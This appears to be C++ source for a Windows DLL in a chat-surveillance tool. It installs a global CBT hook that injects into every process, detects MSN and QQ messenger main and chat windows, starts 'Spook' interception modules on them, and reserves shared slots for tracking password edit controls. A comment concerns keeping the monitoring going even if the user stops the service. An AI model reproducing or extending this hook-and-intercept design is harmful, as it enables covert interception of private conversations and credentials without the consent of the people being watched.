// MonitorService.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "MonitorService.h"
#include "../MSNSpook/MSNSpook.h"
#include "../QQSpook/QQSpook.h"
#include "stdlib.h"

//it is for Win2k+
#define _WIN32_WINNT  0x0500
#ifdef _WIN32_IE 
#undef _WIN32_IE
#define _WIN32_IE 0x0500
#endif
///////////////////////////////////////////////////////////////////////////////

// Instruct the compiler to put these data variable in 
// its own data section called Shared. We then instruct the 
// linker that we want to share the data in this section 
// with all instances of this application.
#pragma data_seg("Shared")
HHOOK g_hNightmareHook = NULL;          //Global CBT Hook Handle 
HWND  g_hNightmareCallerHwnd = NULL;    //Caller Window Handle, Debug Only
DWORD g_dwNightmareThreadIdCaller = 0;  //Caller Thread ID, Debug Only

HWND  g_hNightmareMSNMainWnd = NULL;
HWND  g_hNightmareQQMainWnd[MAX_QQ_CONCUR_MAIN] = {NULL};
DWORD g_dwQQActiveChat = 0;  //only useful to a GUI client, a backend logger will deal all chat instance
DWORD g_dwMSNActiveChat = 0;  //only useful to a GUI client, a backend logger will deal all chat instance
HWND  g_hNightmareMSNChatWnd[MAX_MSN_CONCUR_CHAT] = 
{NULL, NULL, NULL, NULL, NULL, 
NULL, NULL, NULL, NULL, NULL};      //Target MSN Chat Window 
// Row is QQ main process window. Col is each QQ 's chat window.
HWND  g_hNightmareQQChatWnd[MAX_QQ_CONCUR_MAIN][MAX_QQ_CONCUR_CHAT] = {NULL};
// The QQ process id list and main window handle list.
DWORD g_dwQQProcessId[MAX_QQ_CONCUR_MAIN] = {0};

HWND  g_hPwdEdit[MAX_PWD_EDIT] = { NULL, NULL, NULL, NULL, NULL,
NULL, NULL, NULL, NULL, NULL,
NULL, NULL, NULL, NULL, NULL,
NULL, NULL, NULL, NULL, NULL}; 
//Maximum Track 20 password Edit One Time  

HANDLE g_hRichEditEvent;
//HWND g_hPreviousQQMainWnd;
#pragma data_seg()

// Instruct the linker to make the Shared section
// readable, writable, and shared.
#pragma comment(linker, "/section:Shared,rws")

//Hook Procedure
LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam);
///////////////////////////////////////////////////////////////////////////////

#define   POSITION_CHAT   30;

// Nonshared variables
HINSTANCE g_hinstDll = NULL;

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//MessageBox(NULL, _T("MonitorService attatched"), _T(""), MB_OK);
		g_hinstDll = (HINSTANCE)hModule;
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
    }
	/*	for(int i = 0; i < MAX_PWD_EDIT; i++)
	{
	g_hPwdEdit[i] = NULL;
	}
	for(i = 0; i < MAX_MSN_CONCUR_CHAT; i++)
	{
	g_hNightmareMSNChatWnd[i] = NULL;
	}
	g_hNightmareMSNMainWnd = NULL;
	*/
    return TRUE;
}

BOOL WINAPI InitMonitor(HWND hCallerHwnd)
{
	// Make sure that the hook is not already installed.
	for(int i = 0; i < MAX_QQ_CONCUR_MAIN; i++)
	{
		if (g_hNightmareQQMainWnd[i] != NULL && 
			IsWindow(g_hNightmareQQMainWnd[i]) && 
			g_hNightmareHook != NULL)
		{
//			::PopMsg(_T("in InitNightmare g_hNightmareHook != NULL && g_hNightmareMSNMainWnd != NULL"));
			return FALSE;
		}
	}
	if (g_hNightmareMSNMainWnd != NULL && 
		IsWindow(g_hNightmareMSNMainWnd) && 
		g_hNightmareHook != NULL)
	{
//		::PopMsg(_T("in InitNightmare g_hNightmareHook != NULL && g_hNightmareMSNMainWnd != NULL"));
		return FALSE;
	}

    for(i = 0; i < MAX_MSN_CONCUR_CHAT; i++)
	{
		if (g_hNightmareMSNChatWnd[i] != NULL && IsWindow(g_hNightmareMSNChatWnd[i]) && g_hNightmareHook != NULL)
		{
//			::PopMsg(_T("in InitNightmare g_hNightmareHook != NULL && g_hNightmareMSNChatWnd[i] != NULL"));
			return FALSE;
		}
	}
	for(int j = 0; j < MAX_QQ_CONCUR_MAIN; j++)
	{
		for(i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
		{
			if (g_hNightmareQQChatWnd[j][i] != NULL && IsWindow(g_hNightmareQQChatWnd[j][i]) && g_hNightmareHook != NULL)
			{
//				::PopMsg(_T("in InitNightmare g_hNightmareHook != NULL && g_hNightmareQQChatWnd[j][i] != NULL"));
				return FALSE;
			}
		}
	}

	for(i = 0; i < MAX_PWD_EDIT; i++)
	{
		if (g_hPwdEdit[i] != NULL && IsWindow(g_hPwdEdit[i]) && g_hNightmareHook != NULL)
		{
//			::PopMsg(_T("in InitNightmare g_hNightmareHook != NULL && g_hPwdEdit != NULL"));
			return FALSE;
		}
	}

    if (g_hNightmareHook != NULL)
	{
//		::PopMsg(_T("in InitNightmare g_hNightmareHook != NULL"));
		return FALSE;
	}

    g_hNightmareCallerHwnd = hCallerHwnd;
    g_dwNightmareThreadIdCaller = GetCurrentThreadId();

    // Install the hook on the specified thread
    g_hNightmareHook = SetWindowsHookEx(WH_CBT, CBTProc, g_hinstDll, 0);

    if (g_hNightmareHook != NULL) 
		return TRUE; //Succedded

    // Make sure that a hook has been installed.
    ::ReportErr(_T("in InitNightmare -- SetHook return NULL"));
	BOOL b = UnhookWindowsHookEx(g_hNightmareHook);
	if (!b)
	{
		::ReportErr(_T("in InitNightmare -- SetHook Fail->UnsetHook Fail"));
	}
    g_hNightmareHook = NULL;
	return FALSE;
}

BOOL WINAPI ExitMonitor()
{
    if (g_hNightmareHook == NULL) 
	{
		//::ReportErr("in Dll try to Unset a NULL Hook");
		return FALSE;  
	}
	//no use, hook can not re-enter 
	BOOL b =  UnhookWindowsHookEx(g_hNightmareHook);
    if (!b) 
	{
    	//::ReportErr("in Dll-- Unset Hook Failed");
        g_hNightmareHook = NULL;
		return FALSE;  
	}

	g_hNightmareHook = NULL;
	g_hNightmareCallerHwnd = NULL;

	//
	// Exit the MSN hook now.
	::ExitMSNSpook(g_hNightmareMSNMainWnd);
	g_hNightmareMSNMainWnd = NULL;
	// Exit the QQ hook now.
	for(int i = 0; i < MAX_QQ_CONCUR_MAIN; i++)
	{
		HWND hWnd = g_hNightmareQQMainWnd[i];
		if (hWnd)
		{
			DWORD td = ::GetWindowThreadProcessId(hWnd, NULL);
			QQDeleteProcessId(td);
			QQSetMainWnd(NULL, i);
			::ExitQQSpook(hWnd, TRUE);

			for(int j = 0; j < MAX_QQ_CONCUR_CHAT; j++)
			{
				g_hNightmareQQChatWnd[i][j] = NULL;
			}
		}
	}
    //original idea is the service shut down after all the windows are destroyed, so 
	//the CBTProc will receive the WM_DESTROY of the edit handle, but to be safe you
	//have to avoid the user stop the service, so that you have to free the hook for
	//the windows are still there
    for(i = 0; i < MAX_PWD_EDIT; i++)
	{
		g_hPwdEdit[i] = NULL;
	}
	for(i = 0; i < MAX_MSN_CONCUR_CHAT; i++)
	{
		g_hNightmareMSNChatWnd[i] = NULL;
	}
	g_hNightmareMSNMainWnd = NULL;
	
	for(int j = 0; j < MAX_QQ_CONCUR_MAIN; j++)
	{
		for(i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
		{
			g_hNightmareQQChatWnd[j][i] = NULL;
		}
		g_dwQQProcessId[j] = 0;
		g_hNightmareQQMainWnd[j] = NULL;
	}
	// The signal of notice MSN's richedit.
	CloseHandle(g_hRichEditEvent);
	
	return TRUE;
}

/*
 * Hook Codes
 */
//#define HC_ACTION           0
//#define HC_GETNEXT          1
//#define HC_SKIP             2
//#define HC_NOREMOVE         3
//#define HC_NOREM            HC_NOREMOVE
//#define HC_SYSMODALON       4
//#define HC_SYSMODALOFF      5

//#define HCBT_MOVESIZE       0
//#define HCBT_MINMAX         1
//#define HCBT_QS             2
//#define HCBT_CREATEWND      3
//#define HCBT_DESTROYWND     4
//#define HCBT_ACTIVATE       5
//#define HCBT_CLICKSKIPPED   6
//#define HCBT_KEYSKIPPED     7
//#define HCBT_SYSCOMMAND     8
//#define HCBT_SETFOCUS       9

//MSDN says
//At the time of the HCBT_CREATEWND notification,
//the window has been created, but its final size 
//and position may not have been determined and 
//its parent window may not have been established.
//the password dialog poped by IE is the child of the desktop

LRESULT CALLBACK CBTProc(
  int nCode,      // hook code
  WPARAM wParam,  // depends on hook code
  LPARAM lParam   // depends on hook code
)
{
	// First find out the Tencent_QQToolbar, then
	// the previous one is QQ main window.
	// the previous 28(QQ2005) is QQ chat window.
	// When creating procedure.
	// Faint, QQ 2006 is 30 now.
	// For QQ2006, the previous 15 and 16 is RICHEDIT class.
	int nPre1 = 14;
	int nPre2 = 15;
	int nChatPreWnd = POSITION_CHAT;
	static HWND g_hPreviousQQMainWnd = NULL; // should be #32770(main)->afx->static->static->#32770
	static HWND g_hPreviousQQMainWnd2 = NULL;// Afx:61660000:0
	static HWND g_hPreviousQQChatWnd[30] = {NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
	,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL};

	if (nCode < 0)
		return CallNextHookEx(g_hNightmareHook, nCode, wParam, lParam);

	// MSN Message can use HCBT_CREATEWND to identify the window handle.
	// Because when creating the window, the class name is setted by Microsoft.
	if (nCode == HCBT_CREATEWND)
	{
		// Tencent_QQToolBar is child window.
		if (IsQQMainWindow(HWND(wParam)))
		{
			HWND hTemp = g_hPreviousQQMainWnd;
			HWND hTempAfx = g_hPreviousQQMainWnd2;//afx
			HWND hChatTemp = g_hPreviousQQChatWnd[0];
			HWND hPre1 = g_hPreviousQQChatWnd[nPre1];
			HWND hPre2 = g_hPreviousQQChatWnd[nPre2];
			// Tencent_QQToolBar's previous window is QQ main window
			//#32770(main)->afx->static->static->#32770
			if (IsDialog(hTemp) && IsAfxWnd(hTempAfx))
			{
				// QQ main window.
//				PopMsg(_T("Main QQ window's handle is %X "), hTemp);
				// g_hPreviousQQMainWnd was changed to another value after call ::GetWindowThreadProcessId. why?
				DWORD td = ::GetWindowThreadProcessId(hTemp, NULL);
				DWORD dwIndex = QQInsertMainWnd(hTemp);
				if (dwIndex != -1)
				{
					QQSetProcessId(td, dwIndex);
					//QQSetMainWnd(g_hPreviousQQMainWnd, dwIndex);
					::InitQQSpook(hTemp, TRUE);
				}
				else //almost impossible to fail here
				{
					PopMsg(_T("Unable to insert new chat, extended the max count!"));
				}
			}
			else if (IsDialog(hChatTemp) && IsRichedit(hPre1) && IsRichedit(hPre1))
			{
				// QQ chat window.
//				PopMsg(_T("Chat window's handle is %X "), hChatTemp);

				// If this QQ chat window is not hooked.
				if (QQGetChatWindowByHandle(hChatTemp) == -1) 
				{
					DWORD td = ::GetWindowThreadProcessId(hChatTemp, NULL);
					DWORD dwProcessIndex = QQGetIndexByProcessId(td);
					//MessageBox(NULL, _T("QQ new chat window"), _T("new window"), MB_OK);
					DWORD dwNewIndex = QQInsertChatWindowHandle(hChatTemp, dwProcessIndex);
					if (dwNewIndex != -1)
					{
						QQSetActiveChatWindow(hChatTemp); //Make It The Active
						::InitQQSpook(hChatTemp, FALSE);
						// Send the message to Qoom main window.
						HWND hMainWnd = FindWindow(QOOM_MAINWND, NULL);
						DWORD dwIndex = MAKELONG(dwProcessIndex, dwNewIndex);
						::PostMessage(hMainWnd, WM_QQ_CREATECHAT, WPARAM(dwIndex), 0);
					}
					else //almost impossible to fail here
					{
						PopMsg(_T("Unable to Insert New Chat, Err Nightmare's CBTProc"));
					}
				}
				else 
				{
					PopMsg(_T("This chat window already hooked."));
				}
			}
		}
		// QQ chat window.
		// Move the next value to previous, add the new handle to last.
		for (int i = 0; i < nChatPreWnd-1; i++)
		{
			g_hPreviousQQChatWnd[i] = g_hPreviousQQChatWnd[i + 1];
		}
		g_hPreviousQQChatWnd[nChatPreWnd-1] = HWND(wParam);
		// Before main qq window, class name is afx...
		g_hPreviousQQMainWnd2 = g_hPreviousQQMainWnd;
		// Main QQ window.
		g_hPreviousQQMainWnd = HWND(wParam);
		
		if (IsMSNChat((HWND)wParam)) //Chat Window Pop up
		{
			DWORD dwNewIndex = MSNInsertChatWindowHandle((HWND)wParam);
			if (dwNewIndex != -1)
			{
				// Set the dwNewIndex to richedit dll.
				// So the richedit know the storing position.
				// First find the richwin handle
				HWND hRichWnd = FindWindow(RICH_WND_CLASS, NULL);
				::SendMessage(hRichWnd, WM_MSN_INSERTHWND, wParam, 0);
				
				// Notify the richedit dll.
				InvokeRichEdit((HWND)wParam);
				MSNSetActiveChatWindow((HWND)wParam); //Make It The Active
				::InitMSNSpook((HWND)wParam);
				// Send the message to Qoom main window.
				HWND hMainWnd = FindWindow(QOOM_MAINWND, NULL);
				// Here I think PostMessage will be safety.
				::PostMessage(hMainWnd, WM_MSN_CREATECHAT, WPARAM(dwNewIndex), 0);
				//PopMsg(_T("CBT new dwIndex %d "), dwNewIndex);
			}
			else //almost impossible to fail here
			{
				PopMsg(_T("Unable to Insert New Chat, Err Nightmare's CBTProc"));
			}
		}
		
		if (IsMSNMain((HWND)wParam)) //Messager Start
		{
			g_hNightmareMSNMainWnd = (HWND)wParam;
			::InitMSNSpook(g_hNightmareMSNMainWnd);
		}
	}
	
	if (nCode == HCBT_DESTROYWND) 
	{
		//Only the parent dialog of the edit will receive destroy message
        HWND hWnd = (HWND)wParam;
		//If you hooked directly from Application, here will not be reached
		//for we did not get the create event. The create-destroy must be given in pair
		for(int i = 0; i < MAX_QQ_CONCUR_MAIN; i++)
		{
			if ((HWND)wParam == g_hNightmareQQMainWnd[i])
			{
				DWORD td = ::GetWindowThreadProcessId(hWnd, NULL);
//				WriteLogStr(_T("CBTProc HCBT_DESTROYWND QQ main window handle="));
//				WriteLogInt((DWORD)wParam, 16);
//				WriteLogStr(_T("row="));
//				WriteLogInt(i, 10);
				QQDeleteProcessId(td);
				QQSetMainWnd(NULL, i);
				::ExitQQSpook(hWnd, TRUE);

				for(int j = 0; j < MAX_QQ_CONCUR_CHAT; j++)
				{
					g_hNightmareQQChatWnd[i][j] = NULL;
				}
				
				return CallNextHookEx(g_hNightmareHook, nCode, wParam, lParam);
			}
		}

		if (QQGetChatNumber() != 0)
		{
			for(int j = 0; j < MAX_QQ_CONCUR_MAIN; j++)
			{
				for(int i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
				{
					HWND hTmp = ::QQGetChatWindowHandle(j, i);
					if (hWnd == hTmp)
					{
						//return 1;// forbid to close
						//PopMsg(_T("Unhook chat window handle:%X iRow=%d iCol=%d"), (DWORD)hWnd, j, i);
						::ExitQQSpook(hWnd, FALSE);
						::QQDeleteChatWindowHandle(hWnd);
						// Send the message to Qoom main window.
						HWND hMainWnd = FindWindow(QOOM_MAINWND, NULL);
						::PostMessage(hMainWnd, WM_QQ_DESTROYCHAT, WPARAM(MAKELONG(j,i)), 0);
						
						return CallNextHookEx(g_hNightmareHook, nCode, wParam, lParam);
					}
				}
			}
		}
		
		if (MSNGetChatNumber() != 0)
		{
			for(int i = 0; i < MAX_MSN_CONCUR_CHAT; i++)
			{
				hWnd = (HWND)wParam; //hWnd is changed?
                //DWORD td2 = ::GetWindowThreadProcessId(g_hNightmareMSNChatWnd, NULL);
				
				HWND hParent = ::MSNGetChatWindowHandle(i);
//				while(hParent != NULL)
				{
					if (hWnd == hParent) 
					{
//						PopMsg(_T("kill chat"));
						::ExitMSNSpook(g_hNightmareMSNChatWnd[i]);
						::MSNDeleteChatWindowHandle(MSNGetChatWindowHandle(i));

						// Send the message to Qoom main window.
						HWND hRichWnd = FindWindow(RICH_WND_CLASS, NULL);
						HWND hMainWnd = FindWindow(QOOM_MAINWND, NULL);
						::SendMessage(hRichWnd, WM_MSN_DELETEHWND, WPARAM(i), 0);
						::SendMessage(hMainWnd, WM_MSN_DESTROYCHAT, WPARAM(i), 0);
						
						return CallNextHookEx(g_hNightmareHook, nCode, wParam, lParam);
					}
//					HWND hTemp = ::GetParent(hParent);
//					hParent = hTemp;
				}
			}
		}
		
		if ((HWND)wParam == g_hNightmareMSNMainWnd)
		{
			g_hNightmareMSNMainWnd = NULL;
			::ExitMSNSpook((HWND)wParam);
		}
		
	}

	return 0; //permit operation
}

///*
// * Edit Control Styles
// */
//#define ES_LEFT             0x0000L
//#define ES_CENTER           0x0001L
//#define ES_RIGHT            0x0002L
//#define ES_MULTILINE        0x0004L
//#define ES_UPPERCASE        0x0008L
//#define ES_LOWERCASE        0x0010L
//#define ES_PASSWORD         0x0020L
//#define ES_AUTOVSCROLL      0x0040L
//#define ES_AUTOHSCROLL      0x0080L
//#define ES_NOHIDESEL        0x0100L
//#define ES_OEMCONVERT       0x0400L
//#define ES_READONLY         0x0800L
//#define ES_WANTRETURN       0x1000L
//#if (WINVER >= 0x0400)
//#define ES_NUMBER           0x2000L
//#endif /* WINVER >= 0x0400 */


DWORD WINAPI QQInsertChatWindowHandle(HWND hWnd, DWORD dwRowIndex)
{
	if (dwRowIndex < 0 || dwRowIndex >= MAX_QQ_CONCUR_MAIN)
	{
		return -1;
	}
	for(int i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
	{
		if (g_hNightmareQQChatWnd[dwRowIndex][i] == NULL)
		{
			g_hNightmareQQChatWnd[dwRowIndex][i] = hWnd;
			return (DWORD)i;
		}
	}

	return -1;
}

DWORD WINAPI MSNInsertChatWindowHandle(HWND hWnd)
{
	for(int i = 0; i < MAX_MSN_CONCUR_CHAT; i++)
	{
		if (g_hNightmareMSNChatWnd[i] == NULL)
		{
			g_hNightmareMSNChatWnd[i] = hWnd;
			return (DWORD)i;
		}
	}
	//almost impossible unless yr Exchange server setting sth special ????
	//MSN global network only support 10 maximum concurrent chat now
	if (i == MAX_MSN_CONCUR_CHAT) return -1;
	return -1;
}

DWORD WINAPI QQDeleteChatWindowHandle(HWND hWnd)
{
	for(int j = 0; j < MAX_QQ_CONCUR_MAIN; j++)
	{
		for(int i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
		{
			if (g_hNightmareQQChatWnd[j][i] == hWnd)
			{
				g_hNightmareQQChatWnd[j][i] = NULL;
				return (DWORD)i;
			}
		}
	}
	return -1;
}
DWORD WINAPI MSNDeleteChatWindowHandle(HWND hWnd)
{
	for(int i = 0; i < MAX_MSN_CONCUR_CHAT; i++)
	{
		if (g_hNightmareMSNChatWnd[i] == hWnd)
		{
			g_hNightmareMSNChatWnd[i] = NULL;
			return (DWORD)i;
		}
	}
	//almost impossible unless yr Exchange server setting sth special ????
	//MSN global network only support 10 maximum concurrent chat now
	if (i == MAX_MSN_CONCUR_CHAT) return -1;
	return -1;
}

DWORD WINAPI QQGetChatNumber()
{
	DWORD dwRet = 0;
	for(int j = 0; j < MAX_QQ_CONCUR_MAIN; j++)
	{
		for(int i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
		{
			if (g_hNightmareQQChatWnd[j][i]) dwRet++;
		}
	}
	return dwRet;
}
DWORD WINAPI MSNGetChatNumber()
{
	DWORD dwRet = 0;
	for(int i = 0; i < MAX_MSN_CONCUR_CHAT; i++)
	{
		if (g_hNightmareMSNChatWnd[i]) dwRet++;
	}
	return dwRet;
}

void  QQCheckChatHandleArray()
{
	for(int j = 0; j < MAX_QQ_CONCUR_MAIN; j++)
	{
		for(int i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
		{
			if (g_hNightmareQQChatWnd[j][i])
			{
				if (::IsWindow(g_hNightmareQQChatWnd[j][i]) && IsMSNChat(g_hNightmareQQChatWnd[j][i])) 
				{
				}
				else
					g_hNightmareQQChatWnd[j][i] = NULL;
			}
		}
	}
}
void  MSNCheckChatHandleArray()
{
	for(int i = 0; i < MAX_MSN_CONCUR_CHAT; i++)
	{
		if (g_hNightmareMSNChatWnd[i])
		{
			if (::IsWindow(g_hNightmareMSNChatWnd[i]) && IsMSNChat(g_hNightmareMSNChatWnd[i])) 
			{
			}
			else
				g_hNightmareMSNChatWnd[i] = NULL;
		}
	}
}

HWND WINAPI  GetMSNMainHWND()
{
	return g_hNightmareMSNMainWnd;
}
HWND WINAPI  GetQQMainHWND(DWORD dwIndex)
{
	if (dwIndex < 0 || dwIndex > MAX_QQ_CONCUR_MAIN) {
		return NULL;
	}
	return g_hNightmareQQMainWnd[dwIndex];
}

DWORD WINAPI QQGetActiveChat()
{
	// low-order word is the row number.
	// hight-order word is the col number.
	WORD wRow = LOWORD(g_dwQQActiveChat);
	WORD wCol = HIWORD(g_dwQQActiveChat);
	//bound check seems unnessary, just a good habit ~v~
	if ((int)wRow < 0 || (int)wRow >= MAX_QQ_CONCUR_MAIN ||
		(int)wCol < 0 || (int)wCol >= MAX_QQ_CONCUR_CHAT)
	{
		g_dwQQActiveChat = (UINT)-1;
	    return g_dwQQActiveChat;
	}

	if (g_hNightmareQQChatWnd[wRow][wCol])
		return g_dwQQActiveChat;
	for(int j = 0; j < MAX_QQ_CONCUR_MAIN; j++)
	{
		for(int i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
		{
			if (g_hNightmareQQChatWnd[j][i]) 
			{
				g_dwQQActiveChat = MAKELONG(j, i);
				return g_dwQQActiveChat;
			}
		}
	}
	g_dwQQActiveChat = (UINT)-1;
	return g_dwQQActiveChat;
}

DWORD WINAPI MSNGetActiveChat()
{
	//bound check seems unnessary, just a good habit ~v~
	if ((int)g_dwMSNActiveChat < 0 || (int)g_dwMSNActiveChat >= MAX_MSN_CONCUR_CHAT)
	{
		g_dwMSNActiveChat = (UINT)-1;
	    return g_dwMSNActiveChat;
	}

	if (g_hNightmareMSNChatWnd[g_dwMSNActiveChat])
		return g_dwMSNActiveChat;
	for(int i = 0; i < MAX_MSN_CONCUR_CHAT; i++)
	{
		if (g_hNightmareMSNChatWnd[i]) 
		{
			g_dwMSNActiveChat = i;
			return g_dwMSNActiveChat;
		}
	}
	g_dwMSNActiveChat = (UINT)-1;
	return g_dwMSNActiveChat;
}

BOOL WINAPI QQSetActiveChat(DWORD dwActive)
{
	// low-order word is the row number.
	// hight-order word is the col number.
	WORD wRow = LOWORD(g_dwQQActiveChat);
	WORD wCol = HIWORD(g_dwQQActiveChat);
	
	if (!g_hNightmareQQChatWnd[wRow][wCol]) return FALSE;
    g_dwQQActiveChat = dwActive;
	return TRUE;
}
BOOL WINAPI MSNSetActiveChat(DWORD dwActive)
{
	if (!g_hNightmareMSNChatWnd[dwActive]) return FALSE;
    g_dwMSNActiveChat = dwActive;
	return TRUE;
}

BOOL WINAPI QQSetActiveChatWindow(HWND dwActiveWnd)
{
	for(int j = 0; j < MAX_QQ_CONCUR_MAIN; j++)
	{
		for(int i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
		{
			if (g_hNightmareQQChatWnd[j][i] == dwActiveWnd) 
			{
				g_dwQQActiveChat = MAKELONG(j, i);
				return TRUE;
			}
		}
	}
	return FALSE;
}
BOOL WINAPI MSNSetActiveChatWindow(HWND dwActiveWnd)
{
	for(int i = 0; i < MAX_MSN_CONCUR_CHAT; i++)
	{
		if (g_hNightmareMSNChatWnd[i] == dwActiveWnd) 
		{
			g_dwMSNActiveChat = i;
			return TRUE;
		}
	}
	return FALSE;
}

HWND WINAPI QQGetChatWindowHandle(DWORD dwRow, DWORD dwCol)
{
	if (dwRow < 0 || dwRow >= MAX_QQ_CONCUR_MAIN ||
		dwCol < 0 || dwCol >= MAX_QQ_CONCUR_CHAT)
		return NULL;
	return g_hNightmareQQChatWnd[dwRow][dwCol];
}

BOOL WINAPI QQGetChatWindowTitle(DWORD dwRow, DWORD dwCol, TCHAR *szBuf)
{
	HWND hWnd = QQGetChatWindowHandle(dwRow, dwCol);
	if (hWnd == NULL) {
		return FALSE;
	}

	::SendMessage(hWnd, WM_GETTEXT, WPARAM(256), LPARAM(szBuf));
	return TRUE;
}

DWORD WINAPI QQGetChatWindowByHandle(HWND hWnd)
{
	for(int j = 0; j < MAX_QQ_CONCUR_MAIN; j++)
	{
		for(int i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
		{
			if (g_hNightmareQQChatWnd[j][i] == hWnd) 
			{
				return MAKELONG(j, i);
			}
		}
	}
	return (DWORD)-1;
}

HWND WINAPI MSNGetChatWindowHandle(DWORD dwIndex)
{
	if (dwIndex < 0 || dwIndex >= MAX_MSN_CONCUR_CHAT)
		return NULL;
	return g_hNightmareMSNChatWnd[dwIndex];
}

BOOL WINAPI MSNGetChatWindowTitle(DWORD dwIndex, TCHAR *szBuf)
{
	HWND hWnd = MSNGetChatWindowHandle(dwIndex);
	if (hWnd == NULL) {
		return FALSE;
	}
	
	::SendMessage(hWnd, WM_GETTEXT, WPARAM(256), LPARAM(szBuf));
	return TRUE;
}

DWORD WINAPI MSNGetChatWindowByHandle(HWND hWnd)
{
	for(int i = 0; i < MAX_QQ_CONCUR_CHAT; i++)
	{
		if (g_hNightmareMSNChatWnd[i] == hWnd) 
		{
			return (DWORD)i;
		}
	}
	return (DWORD)-1;
}

DWORD WINAPI QQDeleteProcessId(DWORD dwProcessId)
{
	for(int i = 0; i < MAX_QQ_CONCUR_MAIN; i++)
	{
		if (g_dwQQProcessId[i] == dwProcessId)
		{
			g_dwQQProcessId[i] = 0;
			return (DWORD)i;
		}
	}

	return (DWORD)-1;
}

DWORD WINAPI QQSetProcessId(DWORD dwProcessId, DWORD dwIndex)
{
	if (dwIndex < 0 || dwIndex >= MAX_QQ_CONCUR_MAIN)
	{
		return (DWORD)-1;
	}
	g_dwQQProcessId[dwIndex] = dwProcessId;
	
	return dwIndex;
}

DWORD WINAPI QQInsertProcessId(DWORD dwProcessId)
{
	for(int i = 0; i < MAX_QQ_CONCUR_MAIN; i++)
	{
		if (g_dwQQProcessId[i] == 0)
		{
			g_dwQQProcessId[i] = dwProcessId;
			return (DWORD)i;
		}
	}
	return (DWORD)-1;
}

DWORD WINAPI QQGetIndexByProcessId(DWORD dwProcessId)
{
	for(int i = 0; i < MAX_QQ_CONCUR_MAIN; i++)
	{
		if (g_dwQQProcessId[i] == dwProcessId)
		{
			return i;
		}
	}
	return DWORD(-1);
}

DWORD WINAPI QQDeleteMainWnd(HWND hMainWnd)
{
	for(int i = 0; i < MAX_QQ_CONCUR_MAIN; i++)
	{
		if (g_hNightmareQQMainWnd[i] == hMainWnd)
		{
			g_hNightmareQQMainWnd[i] = NULL;
			return (DWORD)i;
		}
	}
	
	return (DWORD)-1;
}

DWORD WINAPI QQSetMainWnd(HWND hMainWnd, DWORD dwIndex)
{
	if (dwIndex < 0 || dwIndex >= MAX_QQ_CONCUR_MAIN)
	{
		return (DWORD)-1;
	}
	g_hNightmareQQMainWnd[dwIndex] = hMainWnd;
	
	return dwIndex;
}

DWORD WINAPI QQInsertMainWnd(HWND hMainWnd)
{
	for(int i = 0; i < MAX_QQ_CONCUR_MAIN; i++)
	{
		if (g_hNightmareQQMainWnd[i] == NULL)
		{
			g_hNightmareQQMainWnd[i] = hMainWnd;
//			PopMsg(_T("g_hNightmareQQMainWnd[%d] = %X"), i, DWORD(g_hNightmareQQMainWnd[i]));
			return (DWORD)i;
		}
	}
	return (DWORD)-1;
}

DWORD WINAPI QQGetIndexByMainWnd(HWND hMainWnd)
{
	for(int i = 0; i < MAX_QQ_CONCUR_MAIN; i++)
	{
		if (g_hNightmareQQMainWnd[i] == hMainWnd)
		{
			return (DWORD)i;
		}
	}
	return DWORD(-1);
}

BOOL InvokeRichEdit(HWND hChatWnd)
{
	g_hRichEditEvent = ::CreateEvent(NULL, TRUE, FALSE, g_RICHEDIT_EVENT_NAME);
	if(g_hRichEditEvent == NULL)
	{
		::ReportErr(_T("g_RICHEDIT_EVENT_NAME Event Creation Failed")); 
		return FALSE;
	}
	// Notify the richedit.dll, that a new chat window is created just now.
	::SetEvent(g_hRichEditEvent);
	return TRUE;
}

/*
//  log when exit main qq window.
//	HANDLE hfile = CreateFile(_T("C:\\123.txt"), GENERIC_WRITE, 0, 
//		NULL, OPEN_ALWAYS, 0, 0);
//	if (hfile != NULL)
//	{
//		for(int iii = 0; iii < MAX_QQ_CONCUR_CHAT; iii ++)
//		{
//			DWORD tmp = (DWORD)g_hNightmareQQMainWnd[iii];
//			if (tmp == 0)
//				continue;
//			int j = SetFilePointer(hfile, 0, NULL, FILE_END);
//			TCHAR buf1[100];
//			itoa(tmp, (char *)buf1, 16);
//			buf1[strlen((const char *)buf1)+1] = '\0';
//			
//			DWORD dwSize;
//			WriteFile(hfile, (LPCVOID)buf1, strlen((const char *)buf1), &dwSize, NULL);
//			WriteFile(hfile, (LPCVOID)_T("\n"), strlen((const char *) _T("\n")), &dwSize, NULL);
//		}
//		CloseHandle(hfile);
//	}
// 
LRESULT CALLBACK CBTProc(
  int nCode,      // hook code
  WPARAM wParam,  // depends on hook code
  LPARAM lParam   // depends on hook code
)
	HANDLE hfile = CreateFile(_T("C:\\123.txt"), GENERIC_WRITE, 0, 
		NULL, OPEN_ALWAYS, 0, 0);
	if (hfile != NULL)
	{
		if (nCode == HCBT_CREATEWND || nCode == HCBT_DESTROYWND) 
		{
			int j = SetFilePointer(hfile, 0, NULL, FILE_END);
			TCHAR buf[100];
			itoa(nCode, (char *)buf, 10);
			buf[strlen((const char *)buf)] = '\0';
			TCHAR buf1[100];
			itoa(DWORD(wParam), (char *)buf1, 16);
			buf[strlen((const char *)buf1)+1] = '\0';

			DWORD dwSize;
			WriteFile(hfile, (LPCVOID)buf, strlen((const char *)buf), &dwSize, NULL);
			WriteFile(hfile, (LPCVOID)_T("	"), strlen((const char *) _T("	")), &dwSize, NULL);
			WriteFile(hfile, (LPCVOID)buf1, strlen((const char *)buf1), &dwSize, NULL);
